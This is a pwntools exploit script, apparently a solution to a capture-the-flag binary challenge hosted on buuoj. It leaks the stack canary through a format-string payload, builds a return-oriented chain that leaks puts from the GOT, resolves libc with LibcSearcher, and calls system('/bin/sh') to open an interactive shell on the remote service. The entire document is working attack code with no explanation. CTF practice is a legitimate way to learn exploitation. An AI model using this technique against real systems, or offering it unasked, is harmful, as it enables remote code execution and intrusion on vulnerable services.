from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 25599)

payload = "%7$p"
io.recvuntil("I'll give u some gift to help u!\n")
io.sendline(payload)

canary = int(io.recvuntil("\n"), 16)
print(hex(canary))

pop_rdi = 0x400993
puts_got = 0x601018
puts_plt = 0x400610
vuln = 0x0400887
payload = "a"*24 + p64(canary) + p64(0xdeadbeaf)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)
io.recvuntil("story!\n")
io.sendline(payload)

addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

libc = LibcSearcher("puts", addr)
base = addr - libc.dump("puts")
system = base + libc.dump("system")
binsh = base + libc.dump("str_bin_sh")

payload = "a"*24 + p64(canary) + p64(0xdeadbeaf)
payload += p64(pop_rdi) + p64(binsh) + p64(system) + p64(vuln)
io.recvuntil("story!\n")
io.sendline(payload)

io.interactive()